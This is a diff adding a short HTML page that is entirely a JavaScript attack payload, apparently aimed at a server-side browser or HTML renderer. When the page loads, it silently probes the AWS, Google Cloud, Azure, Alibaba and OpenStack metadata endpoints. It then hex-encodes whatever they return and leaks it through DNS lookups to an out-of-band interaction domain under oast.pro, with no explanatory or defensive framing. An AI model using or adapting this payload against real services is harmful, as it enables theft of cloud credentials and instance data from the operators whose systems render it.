@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+function dnsExfil(lbl, text) {
+  var hex = '';
+  for (var i = 0; i < Math.min(text.length, 60); i++)
+    hex += ('0' + text.charCodeAt(i).toString(16)).slice(-2);
+  (hex.match(/.{1,30}/g) || []).forEach(function(c, i) { dns(lbl + '-' + i + '-' + c); });
+  dns(lbl + '-end-len' + text.length);
+}
+
+dns('v9-start');
+
+// 4-second async fetch probes (context stays alive while they are pending)
+var T = 4000;
+var targets = [
+  ['aw',  'http://169.254.169.254/latest/meta-data/'],
+  ['yc',  'http://169.254.169.254/computeMetadata/v1/project/project-id', {'Metadata-Flavor':'Google'}],
+  ['az',  'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {'Metadata':'true'}],
+  ['ali', 'http://100.100.100.200/latest/meta-data/'],
+  ['os',  'http://169.254.169.254/openstack/latest/meta_data.json'],
+];
+
+targets.forEach(function(t) {
+  var lbl = t[0], url = t[1], hdrs = t[2] || {};
+  var t0 = Date.now();
+  dns('try-' + lbl + '-4s');
+  fetch(url, {headers: hdrs, signal: AbortSignal.timeout(T)})
+    .then(function(r) {
+      return r.text().then(function(b) {
+        dns('ok-' + lbl + '-s' + r.status + '-' + (Date.now() - t0) + 'ms');
+        dnsExfil('d-' + lbl, b);
+      });
+    })
+    .catch(function(e) {
+      // AbortSignal.timeout() throws TimeoutError, manual abort throws AbortError
+      var isTO = (e.name === 'AbortError' || e.name === 'TimeoutError');
+      dns('fail-' + lbl + '-' + (isTO ? 'time' : 'err') + '-' + (Date.now() - t0) + 'ms');
+    });
+});
+
+// XHR fallback (different PNA enforcement path)
+var xhr = new XMLHttpRequest();
+xhr.timeout = T;
+var xT0 = Date.now();
+dns('try-xhr-aw-4s');
+xhr.onload = function() {
+  dns('ok-xhr-aw-s' + xhr.status + '-' + (Date.now() - xT0) + 'ms');
+  dnsExfil('d-xhr-aw', xhr.responseText);
+};
+xhr.onerror = function() { dns('fail-xhr-aw-err-' + (Date.now() - xT0) + 'ms'); };
+xhr.ontimeout = function() { dns('fail-xhr-aw-time-' + (Date.now() - xT0) + 'ms'); };
+xhr.open('GET', 'http://169.254.169.254/latest/meta-data/');
+xhr.send();
+
+dns('v9-end');
+</script>
+</body>
+</html>
